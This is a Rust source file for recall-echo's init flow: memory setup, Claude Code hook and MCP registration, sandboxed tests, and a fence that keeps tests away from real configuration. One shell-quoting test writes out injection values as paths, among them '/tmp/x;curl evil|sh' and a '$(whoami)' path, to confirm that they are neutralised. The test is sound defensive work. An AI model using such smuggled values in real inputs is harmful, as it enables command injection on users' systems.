        ARCHIVE_TEMPLATE,
        "ARCHIVE.md",
    );

    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build();
    let runtime = match runtime {
        Ok(runtime) => Some(runtime),
        Err(e) => {
            print_status(Status::Error, &format!("Failed to start runtime: {e}"));
            None
        }
    };

    if let Some(runtime) = &runtime {
        init_graph(runtime, &memory_dir);
    }

    let detected = agent_cli::installed();
    let provider = configure_llm(reader, &memory_dir, &detected);

    // Hooks are Claude Code's capture mechanism, not a consequence of the
    // extraction provider: a user who extracts with grok still wants their
    // Claude Code sessions archived. `configure_hooks` no-ops when Claude Code
    // is not installed.
    configure_hooks(roots, entity_root);

    let mcp = match &runtime {
        Some(runtime) => register_mcp_clients(runtime, &detected, entity_root, roots),
        None => Vec::new(),
    };

    // Last, so an interrupted download costs nothing already done.
    let embedder = warm_embedding_model(&memory_dir, roots);

    print_summary(&Summary {
        memory_dir,
        provider,
        capture: agent_cli::capturing(),
        mcp,
        embedder,
    });

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;
    use std::path::PathBuf;
    use std::time::SystemTime;

    /// An entity root and a sandbox for everything `init` writes outside it.
    ///
    /// Every test here runs the real writers; none of them may reach the
    /// developer's `~/.claude`, `~/.claude.json` or persisted entity root
    /// (#59). The destinations are an argument, not an environment variable,
    /// so this is safe under a parallel test runner.
    struct Sandbox {
        dir: tempfile::TempDir,
        roots: paths::ConfigRoots,
    }

    impl Sandbox {
        fn new() -> Self {
            let dir = tempfile::tempdir().unwrap();
            let entity = dir.path().join("entity");
            fs::create_dir_all(&entity).unwrap();
            let roots = paths::ConfigRoots::sandboxed(dir.path()).unwrap();
            Self { dir, roots }
        }

        fn entity_root(&self) -> PathBuf {
            self.dir.path().join("entity")
        }

        fn init(&self, input: &str) -> Result<(), RecallError> {
            let mut reader = Cursor::new(input.as_bytes());
            run_with(&self.entity_root(), &mut reader, &self.roots)
        }
    }

    #[test]
    fn init_creates_directories_and_files() {
        let sandbox = Sandbox::new();
        sandbox.init("skip\n").unwrap(); // skip provider prompt

        let root = sandbox.entity_root();
        assert!(root.join("memory/MEMORY.md").exists());
        assert!(root.join("memory/EPHEMERAL.md").exists());
        assert!(root.join("memory/ARCHIVE.md").exists());
        assert!(root.join("memory/conversations").exists());
    }

    /// Everything `init` writes outside the entity root lands in the sandbox:
    /// the persisted pointer exists there, and it names the entity root.
    #[test]
    fn init_persists_the_entity_root_inside_the_sandbox() {
        let sandbox = Sandbox::new();
        sandbox.init("skip\n").unwrap();

        let persisted = sandbox.roots.entity_root_file().expect("a destination");
        let pinned = fs::read_to_string(persisted).expect("persisted inside the sandbox");
        assert_eq!(
            pinned.trim(),
            fs::canonicalize(sandbox.entity_root())
                .unwrap()
                .to_string_lossy()
        );
    }

    #[test]
    fn init_is_idempotent() {
        let sandbox = Sandbox::new();
        let root = sandbox.entity_root();
        sandbox.init("skip\n").unwrap();
        fs::write(root.join("memory/MEMORY.md"), "custom content").unwrap();

        sandbox.init("skip\n").unwrap();
        let content = fs::read_to_string(root.join("memory/MEMORY.md")).unwrap();
        assert_eq!(content, "custom content");
    }

    /// A second `init` must not re-run the provider prompt or rewrite the
    /// config the user has since edited.
    #[test]
    fn a_second_init_preserves_the_configured_provider() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().to_path_buf();
        let memory_dir = root.join("memory");
        fs::create_dir_all(&memory_dir).unwrap();

        let chosen = configure_llm(
            &mut Cursor::new(b"" as &[u8]),
            &memory_dir,
            &[AgentCli::Grok],
        );
        assert_eq!(chosen, Some(Provider::Grok));

        // Empty reader: a prompt here would take the default and lose grok.
        let again = configure_llm(
            &mut Cursor::new(b"" as &[u8]),
            &memory_dir,
            &[AgentCli::ClaudeCode, AgentCli::Codex],
        );
        assert_eq!(again, Some(Provider::Grok));
    }

    #[test]
    fn init_fails_if_root_missing() {
        let sandbox = Sandbox::new();
        let mut reader = Cursor::new(b"" as &[u8]);
        let result = run_with(Path::new("/nonexistent/path"), &mut reader, &sandbox.roots);
        assert!(result.is_err());
    }

    /// One installed CLI is not a choice, so it is not a question — the reader
    /// is never touched.
    #[test]
    fn a_single_installed_cli_is_chosen_without_asking() {
        let mut reader = Cursor::new(b"" as &[u8]);
        assert_eq!(
            select_provider(&mut reader, &[AgentCli::Codex]),
            Some(Provider::Codex)
        );
        assert_eq!(reader.position(), 0, "nothing should have been read");
    }

    /// Non-interactive (the tests, and any scripted install): pick the default
    /// rather than block on a prompt nobody can answer.
    #[test]
    fn several_installed_clis_default_without_blocking() {
        let mut reader = Cursor::new(b"" as &[u8]);
        let chosen = select_provider(&mut reader, &[AgentCli::Grok, AgentCli::Codex]);
        assert_eq!(chosen, Some(Provider::Grok));
    }

    #[test]
    fn the_default_prefers_claude_code_over_install_order() {
        assert_eq!(
            default_cli(&[AgentCli::Codex, AgentCli::ClaudeCode]),
            AgentCli::ClaudeCode
        );
        assert_eq!(
            default_cli(&[AgentCli::Gemini, AgentCli::Grok]),
            AgentCli::Gemini
        );
        assert_eq!(default_cli(&[]), AgentCli::ClaudeCode);
    }

    #[test]
    fn no_installed_cli_falls_back_to_the_full_menu() {
        let mut reader = Cursor::new(b"" as &[u8]);
        assert_eq!(select_provider(&mut reader, &[]), Some(Provider::Anthropic));
    }

    #[test]
    fn the_summary_names_the_cost_of_each_provider() {
        assert!(extraction_line(&Provider::Grok).contains("no API billing"));
        assert!(extraction_line(&Provider::Anthropic).contains("ANTHROPIC_API_KEY"));
        assert!(extraction_line(&Provider::Openai).contains("free"));
    }

    #[test]
    fn the_summary_lists_only_the_clients_that_registered() {
        let summary = Summary {
            memory_dir: std::path::PathBuf::from("/tmp/memory"),
            provider: Some(Provider::Grok),
            capture: vec![Source::Grok],
            mcp: vec![
                McpReport {
                    cli: AgentCli::ClaudeCode,
                    status: McpStatus::Registered,
                    command: String::new(),
                },
                McpReport {
                    cli: AgentCli::Grok,
                    status: McpStatus::AlreadyRegistered,
                    command: String::new(),
                },
                McpReport {
                    cli: AgentCli::Gemini,
                    status: McpStatus::Failed("no".into()),
                    command: String::new(),
                },
            ],
            embedder: WarmOutcome::Ready,
        };
        assert_eq!(summary.mcp_ready(), ["claude-code", "grok"]);
    }

    fn upsert(settings: &mut serde_json::Value, root: &str) -> (bool, Vec<String>) {
        let mut skipped = Vec::new();
        let changed = upsert_recall_hooks(
            settings,
            "/usr/local/bin/recall-echo",
            Path::new(root),
            &mut skipped,
        )
        .unwrap();
        (changed, skipped)
    }

    #[test]
    fn hooks_carry_the_entity_root() {
        let mut settings = serde_json::json!({});
        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        assert!(skipped.is_empty());

        let text = settings.to_string();
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
        assert!(text.contains("checkpoint --trigger precompact --entity-root '/home/d/.wiseferry'"));
        assert!(text.contains("consume '/home/d/.wiseferry'"));
    }

    /// The pre-4.2 bare hook is exactly what left capture broken outside the
    /// entity root. A re-run of `init` must repair it, not declare it present.
    #[test]
    fn a_legacy_bare_hook_is_rewritten_not_skipped() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionStart": [{
                    "matcher": "startup|resume",
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
                }],
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]
                }],
                "PreCompact": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact"}]
                }]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        // Every rewrite is reported — a silent replacement of a command the
        // user may have edited is how trust in the installer dies.
        assert_eq!(notes.len(), 3, "{notes:?}");
        assert!(notes.iter().all(|n| n.contains("updated")), "{notes:?}");

        let text = settings.to_string();
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
        // Rewritten in place, not duplicated alongside the bare form.
        assert_eq!(text.matches("archive-session").count(), 1);
        assert_eq!(text.matches("checkpoint").count(), 1);
        assert_eq!(text.matches("consume").count(), 1);
    }

    #[test]
    fn a_correct_hook_set_is_left_unchanged() {
        let mut settings = serde_json::json!({});
        upsert(&mut settings, "/home/d/.wiseferry");

        let before = settings.clone();
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
        assert_eq!(settings, before);
    }

    #[test]
    fn foreign_hooks_are_never_touched() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "notify-send done"}]
                }]
            }
        });
        upsert(&mut settings, "/home/d/.wiseferry");

        let text = settings.to_string();
        assert!(text.contains("notify-send done"));
        assert!(text.contains("archive-session --entity-root '/home/d/.wiseferry'"));
    }

    /// A recall-echo hook the user wrapped or guarded — the `|| true`
    /// SessionEnd guard pulse-null depends on, a `timeout` prefix, a chained
    /// cleanup — is deliberate configuration. Repairing it would break it;
    /// it must be reported and left alone, and not duplicated either.
    #[test]
    fn a_wrapped_recall_hook_is_reported_not_rewritten() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session || true"}]
                }]
            }
        });
        let (_, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
        assert_eq!(skipped.len(), 1);
        assert!(
            skipped[0].contains("archive-session || true"),
            "{skipped:?}"
        );

        let text = settings.to_string();
        assert!(text.contains("archive-session || true"));
        // Not duplicated with a canonical form alongside it.
        assert_eq!(text.matches("archive-session").count(), 1);
    }

    /// Quoting is unconditional and single-quoted: `$`, backticks, `;`, `"`
    /// and spaces must all reach the shell as literal path bytes.
    #[test]
    fn a_root_with_shell_metacharacters_is_neutralized() {
        for (root, quoted) in [
            (
                "/Users/d/My Files/.wiseferry",
                "'/Users/d/My Files/.wiseferry'",
            ),
            ("/tmp/x;curl evil|sh", "'/tmp/x;curl evil|sh'"),
            ("/tmp/$(whoami)/`id`", "'/tmp/$(whoami)/`id`'"),
        ] {
            let mut settings = serde_json::json!({});
            upsert(&mut settings, root);
            let text = settings.to_string();
            // None of these roots contain characters JSON escapes, so a
            // plain substring check sees exactly what the shell will.
            assert!(
                text.contains(&format!("--entity-root {quoted}")),
                "{root}: {text}"
            );
        }
    }

    /// An embedded single quote is the one byte single-quoting cannot pass
    /// through directly — it must be closed, escaped, reopened.
    #[test]
    fn an_embedded_single_quote_is_escaped() {
        assert_eq!(
            shell_path(Path::new("/home/d/o'brien")),
            r"'/home/d/o'\''brien'"
        );
    }

    /// Two stale hooks under one event — a binary-path change under the old
    /// installer could leave both — must both be repaired in one pass, not
    /// first-one-wins with the duplicate left permanently unreachable.
    #[test]
    fn duplicate_stale_hooks_collapse_to_one() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [
                    {"hooks": [{"type": "command", "command": "/old/path/recall-echo archive-session"}]},
                    {"hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]}
                ]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed);
        // Repairing both would turn a dead duplicate into a live one that
        // archives every session twice at double the extraction bill.
        assert!(
            notes.iter().any(|n| n.contains("removed a duplicate")),
            "{notes:?}"
        );

        let expected =
            "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/.wiseferry'";
        let text = settings.to_string();
        assert_eq!(text.matches(expected).count(), 1, "{text}");
        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
        // And a second run has nothing left to do.
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
    }

    /// A prefix wrapper carries no shell operator, but it is customization
    /// all the same — `timeout 30 recall-echo archive-session` exists to
    /// bound a hang, and rewriting it would silently drop the bound.
    #[test]
    fn a_prefix_wrapped_hook_is_not_rewritten() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "timeout 30 /usr/local/bin/recall-echo archive-session"}]
                }]
            }
        });
        let (_, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(notes.iter().any(|n| n.contains("unchanged")), "{notes:?}");

        let text = settings.to_string();
        assert!(text.contains("timeout 30 /usr/local/bin/recall-echo archive-session"));
        // The wrapped hook stays the only one — no canonical duplicate added.
        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
    }

    /// A canonical hook whose quoted root happens to contain shell operators
    /// (`;` is a legal path byte) is still ours: the operator scan must look
    /// outside the quotes, or our own hooks become permanently unrepairable.
    #[test]
    fn a_quoted_root_with_operators_stays_repairable() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --entity-root '/tmp/a;b'"}]
                }]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed, "{notes:?}");

        let text = settings.to_string();
        assert!(
            text.contains("--entity-root '/home/d/.wiseferry'"),
            "{text}"
        );
        assert!(!text.contains("/tmp/a;b"), "{text}");
    }

    /// No Claude Code, no hooks — and nothing written anywhere looking for it.
    #[test]
    fn hooks_are_skipped_when_claude_code_is_absent() {
        let sandbox = Sandbox::new();
        let roots = sandbox.roots.clone().without_claude_code();
        assert!(!configure_hooks(&roots, &sandbox.entity_root()));
        assert!(!sandbox.dir.path().join(".claude/settings.json").exists());
    }

    /// The whole init flow, run against a sandbox, writes the hooks into the
    /// sandbox's `settings.json` — through the real `configure_hooks`
    /// dispatcher, with no guard short-circuiting it — and leaves the real
    /// configuration exactly as it found it (#59).
    ///
    /// The real paths are computed here rather than asked of the code under
    /// test: a sentinel that trusts the thing it is watching is not a sentinel.
    #[test]
    fn the_real_config_is_untouched_by_the_init_flow() {
        let before = RealConfig::snapshot();

        let sandbox = Sandbox::new();
        sandbox.init("skip\n").unwrap();

        // The flow really did run and really did write — otherwise this test
        // would pass on a no-op.
        assert!(sandbox.entity_root().join("memory/MEMORY.md").exists());
        assert!(sandbox
            .roots
            .entity_root_file()
            .is_some_and(std::path::Path::exists));
        let hooks = fs::read_to_string(sandbox.roots.claude_dir().unwrap().join("settings.json"))
            .expect("hooks landed in the sandbox");
        for command in ["archive-session", "checkpoint", "consume"] {
            assert!(
                hooks.contains(&format!("{} {command}", sandbox.roots.recall_bin())),
                "{command} missing from the sandboxed settings.json: {hooks}"
            );
        }

        before.assert_unchanged();
    }

    /// The three files a real user's setup lives in, as digests.
    ///
    /// Never their contents: this runs on a developer's machine, and a failure
    /// message that dumps `~/.claude.json` would publish every project path and
    /// MCP credential on it. Existence, length and SHA-256 say "changed"
    /// without saying what.
    struct RealConfig {
        entries: Vec<Digest>,
        /// Hook commands mentioning recall-echo, and the MCP server names, as
        /// they stood before: the shapes *this* code writes.
        hook_commands: Vec<String>,
        mcp_servers: Vec<String>,
    }

    impl RealConfig {
        fn snapshot() -> Self {
            Self {
                entries: vec![
                    Digest::take(real_settings_file(), Strictness::Exact),
                    Digest::take(real_claude_json(), Strictness::WhenUntouched),
                    Digest::take(real_entity_root_file(), Strictness::Exact),
                ],
                hook_commands: recall_hook_commands(&real_settings_file()),
                mcp_servers: mcp_server_names(&real_claude_json()),
            }
        }

        fn assert_unchanged(&self) {
            for entry in &self.entries {
                entry.assert_unchanged();
            }
            assert_eq!(
                recall_hook_commands(&real_settings_file()),
                self.hook_commands,
                "a recall-echo hook was added to or removed from the real settings.json"
            );
            assert_eq!(
                mcp_server_names(&real_claude_json()),
                self.mcp_servers,
                "an MCP server was added to or removed from the real ~/.claude.json"
            );
        }
    }

    /// `~/.claude/settings.json`, computed independently of `paths`.
    fn real_settings_file() -> PathBuf {
        real_home().join(".claude").join("settings.json")
    }

    fn real_claude_json() -> PathBuf {
        real_home().join(".claude.json")
    }

    fn real_entity_root_file() -> PathBuf {
        let base = match std::env::var_os("XDG_CONFIG_HOME") {
            Some(dir) if !dir.is_empty() => PathBuf::from(dir),
            _ => real_home().join(".config"),
        };
        base.join("recall-echo").join("entity-root")
    }

    fn real_home() -> PathBuf {
        dirs::home_dir().expect("a home directory")
    }

    /// Every hook command in `settings.json` that mentions recall-echo.
    fn recall_hook_commands(settings: &Path) -> Vec<String> {
        let Some(value) = read_json(settings) else {
            return Vec::new();
        };
        let mut found: Vec<String> = Vec::new();
        collect_hook_commands(&value, &mut found);
        found.retain(|command| command.contains("recall-echo"));
        found.sort();
        found
    }

    fn collect_hook_commands(value: &serde_json::Value, out: &mut Vec<String>) {
        match value {
            serde_json::Value::Object(map) => {
                if let Some(serde_json::Value::String(command)) = map.get("command") {
                    out.push(command.clone());
                }
                for nested in map.values() {
                    collect_hook_commands(nested, out);
                }
            }
            serde_json::Value::Array(items) => {
                for nested in items {
                    collect_hook_commands(nested, out);
                }
            }
            _ => {}
        }
    }

    /// The names under `mcpServers` in `~/.claude.json`.
    fn mcp_server_names(claude_json: &Path) -> Vec<String> {
        let Some(value) = read_json(claude_json) else {
            return Vec::new();
        };
        let mut names: Vec<String> = value
            .get("mcpServers")
            .and_then(serde_json::Value::as_object)
            .map(|servers| servers.keys().cloned().collect())
            .unwrap_or_default();
        names.sort();
        names
    }

    fn read_json(path: &Path) -> Option<serde_json::Value> {
        serde_json::from_str(&fs::read_to_string(path).ok()?).ok()
    }

    /// How much of a file's sameness this suite is entitled to assert.
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum Strictness {
        /// Nothing else writes this file while the suite runs: every byte and
        /// the mtime must be identical afterwards.
        Exact,
        /// Claude Code rewrites `~/.claude.json` continuously during a live
        /// session — which is exactly when this suite runs. The mtime is a
        /// witness rather than an assertion here: an unchanged mtime means
        /// nobody else wrote, so the bytes must match too; a newer one means
        /// somebody did, and only the shape assertions (no new `mcpServers`
        /// entry) can speak. Comparing bytes unconditionally would be a test
        /// that fails on other people's writes.
        WhenUntouched,
    }

    /// Existence, length and SHA-256 of one path — enough to prove "unchanged",
    /// never enough to leak what is in it.
    #[derive(Debug, Clone, PartialEq, Eq)]
    struct Digest {
        path: PathBuf,
        exists: bool,
        len: u64,
        sha256: String,
        mtime: Option<SystemTime>,
        strictness: Strictness,
    }

    impl Digest {
        fn take(path: PathBuf, strictness: Strictness) -> Self {
            use sha2::{Digest as _, Sha256};
            let bytes = fs::read(&path).ok();
            let sha256 = bytes
                .as_ref()
                .map_or_else(String::new, |bytes| format!("{:x}", Sha256::digest(bytes)));
            Self {
                exists: bytes.is_some(),
                len: bytes.map_or(0, |bytes| bytes.len() as u64),
                sha256,
                mtime: fs::metadata(&path).ok().and_then(|m| m.modified().ok()),
                path,
                strictness,
            }
        }

        fn assert_unchanged(&self) {
            let now = Digest::take(self.path.clone(), self.strictness);
            let path = self.path.display();
            assert_eq!(
                now.exists, self.exists,
                "{path} came into being or vanished"
            );
            let compare_bytes = match self.strictness {
                Strictness::Exact => {
                    assert_eq!(now.mtime, self.mtime, "{path} was touched");
                    true
                }
                Strictness::WhenUntouched => now.mtime == self.mtime,
            };
            if compare_bytes {
                assert_eq!(now.len, self.len, "{path} changed length");
                assert_eq!(now.sha256, self.sha256, "{path} was rewritten");
            }
        }
    }

    #[test]
    fn archive_template_has_header() {
        let sandbox = Sandbox::new();
        sandbox.init("skip\n").unwrap();
        let content = fs::read_to_string(sandbox.entity_root().join("memory/ARCHIVE.md")).unwrap();
        assert!(content.contains("# Conversation Archive"));
        assert!(content.contains("| # | Date"));
    }
}

/// The suite's own fence: no test may call an `init` entry point that resolves
/// the real configuration for itself.
///
/// [`run_with_reader`] and [`run`] build [`paths::ConfigRoots::from_env`], and
/// that is the whole of #59 — a test calling either rewrites the developer's
/// hooks and global entity-root pointer. Tests take `run_with` and a sandbox.
/// Reading `from_env` to assert production resolution is allowed on a line
/// marked `sanctioned:`.
#[cfg(test)]
mod suite_fence {
    use std::path::{Path, PathBuf};

    const FORBIDDEN: [&str; 3] = [
        "run_with_reader(",        // sanctioned: the needle itself
        "init::run(",              // sanctioned: the needle itself
        "ConfigRoots::from_env()", // sanctioned: the needle itself
    ];

    fn rs_files(dir: &Path, out: &mut Vec<PathBuf>) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return;
        };
        for entry in entries {
            let path = entry.expect("dir entry").path();
            if path.is_dir() {
                rs_files(&path, out);
            } else if path.extension().is_some_and(|e| e == "rs") {
                out.push(path);
            }
        }
    }

    /// The test-only region of a source file: everything from its first
    /// `#[cfg(test)]` on. Integration tests under `tests/` are test-only whole.
    fn test_region(source: &str, whole_file: bool) -> &str {
        if whole_file {
            return source;
        }
        source
            .find("#[cfg(test)]")
            .map_or("", |start| &source[start..])
    }

    #[test]
    fn no_test_reaches_the_real_configuration() {
        let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
        let mut files = Vec::new();
        rs_files(&manifest.join("src"), &mut files);
        let src_count = files.len();
        rs_files(&manifest.join("tests"), &mut files);
        assert!(
            src_count > 0 && files.len() > src_count,
            "scan walked nothing — CARGO_MANIFEST_DIR wrong?"
        );

        let offenders: Vec<String> = files
            .iter()
            .flat_map(|path| {
                let source = std::fs::read_to_string(path).expect("read");
                let whole_file = path.starts_with(manifest.join("tests"));
                let region = test_region(&source, whole_file).to_string();
                let path = path.clone();
                region
                    .lines()
                    .filter(|line| !line.contains("sanctioned:"))
                    .filter(|line| FORBIDDEN.iter().any(|needle| line.contains(needle)))
                    .map(|line| format!("{}: {}", path.display(), line.trim()))
                    .collect::<Vec<_>>()
            })
            .collect();

        assert!(
            offenders.is_empty(),
            "tests must take `init::run_with` with sandboxed ConfigRoots:\n{}",
            offenders.join("\n")
        );
    }
}
